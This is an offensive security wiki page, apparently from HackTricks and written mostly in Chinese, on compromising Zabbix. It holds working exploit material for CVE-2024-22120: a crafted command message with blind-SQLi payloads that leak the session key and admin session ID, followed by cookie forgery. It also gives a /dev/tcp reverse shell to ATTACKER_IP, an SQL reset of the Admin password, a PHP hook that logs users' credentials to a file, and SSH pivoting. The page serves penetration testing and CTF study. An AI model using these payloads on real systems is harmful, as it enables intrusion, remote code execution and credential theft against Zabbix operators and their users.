# Zabbix 安全

{{#include ../../banners/hacktricks-training.md}}

## 概述

Zabbix 是一个监控平台，暴露了一个 web UI（通常位于 Apache/Nginx 之后）以及一个服务端组件，该组件在 TCP/10051（server/trapper）上使用 Zabbix 协议通信，agent 在 TCP/10050 上监听。测试过程中你可能会遇到：

- Web UI: HTTP(S) 虚拟主机，例如 zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

有用的 cookie 格式：zbx_session 是一个紧凑 JSON 对象的 Base64 编码，至少包含 sessionid、serverCheckResult、serverCheckTime 和 sign。sign 是对 JSON 负载的 HMAC。

## zbx_session cookie 内部结构

近期的 Zabbix 版本按如下方式计算该 cookie：

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- 最终 cookie: Base64(JSON_with_sign)

如果你能恢复全局 session_key 和一个有效的 admin sessionid，就可以离线伪造一个有效的 Admin cookie 并对 UI 进行身份验证。

## CVE-2024-22120 — Time-based blind SQLi in Zabbix Server audit log

受影响的版本（根据公开文档）：

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

漏洞概要：

- 当一个 Script 执行被记录到 Zabbix Server 审计日志时，clientip 字段没有被清洗并被拼接进 SQL，使得通过 server 组件发生 time-based blind SQLi 成为可能。
- 该漏洞可通过向 Zabbix server 端口 10051 发送精心构造的 "command" 请求来利用，要求具备一个有效的低权限 sessionid、用户可访问的 hostid，以及被允许的 scriptid。

先决条件和发现提示：

- sessionid：从 web UI 的 guest/login，解码 zbx_session (Base64) 来获得 sessionid。
- hostid：通过 web UI 请求观察（例如 Monitoring → Hosts）或用代理拦截；常见默认是 10084。
- scriptid：只有当前角色被允许的脚本会执行；通过检查 script 菜单/AJAX 响应来验证。像 1 或 2 这样的默认值通常被允许；3 可能被拒绝。

### 利用流程

1) 触发在 clientip 中的 SQLi 导致审计插入

- 连接到 TCP/10051 并发送一个 Zabbix 封装消息，request="command"，包含 sid、hostid、scriptid，并将 clientip 设置为一个 SQL 表达式，该表达式会被服务器拼接并执行。

最小消息（JSON 主体）字段：
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
完整的 wire 格式是: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON。你可以使用 pwntools 或你自己的 socket 代码来构造它。

2) Time-bruteforce secrets via conditional sleep

使用条件表达式，通过测量响应时间逐个字符地 leak hex-encoded secrets。以下是实践中有效的示例：

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) 从 sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Notes:

- charset: 32 hex chars [0-9a-f]
- Pick T_TRUE >> T_FALSE (e.g., 10 vs 1) and measure wall-clock per attempt
- Ensure your scriptid is actually authorized for the user; otherwise no audit row is produced and timing won’t work

3) 伪造 Admin cookie

Once you have:

- session_key: 32-hex from config.session_key
- admin_sessionid: 32-hex from sessions.sessionid for userid=1

Compute:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Set the cookie zbx_session to this value and GET /zabbix.php?action=dashboard.view to validate Admin access.

### 现成工具

- Public PoC 自动化：bruteforce of session_key and admin sessionid, and cookie forging；需要 pwntools 和 requests。
- 通常需要提供的参数包括：--ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, 以及可选的已知 --admin-sid 用以跳过暴力破解。

## RCE via Script execution (post-Admin)

With Admin access in the UI, you can execute predefined Scripts against monitored hosts. If agents/hosts execute script commands locally, this yields code execution on those systems (often as the zabbix user on Linux hosts):

- Quick check: run id to confirm user context
- Reverse shell example:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
TTY 升级 (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
如果你有 DB 访问权限，替代 forging a cookie 的方法是将 Admin 密码重置为文档中记录的 bcrypt（用于 "zabbix"）：
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

如果在 web UI server 上可以进行 file write，你可以在 /usr/share/zabbix/index.php 的 form-based login branch 附近临时添加一个 logging snippet 来 capture credentials：
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
用户会正常进行认证；之后读取 /dev/shm/creds.txt。完成后移除 hook。

## Pivoting 到内部服务

即使服务账号的 shell 是 /usr/sbin/nologin，添加一个 SSH authorized_keys entry 并使用 -N -L，仍然可以本地端口转发到仅限 loopback 的服务（例如 CI/CD 在 8111）：
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
查看更多隧道模式：查看 [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md)。

## 操作提示

- 验证 scriptid 是否被当前角色允许（guest 可能只有有限的权限集）
- Timing brute 可能很慢；缓存恢复的 admin sessionid 并重用它
- 发送到 10051 的 JSON 必须以 ZBXD\x01 头和小端序长度封装

## References

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
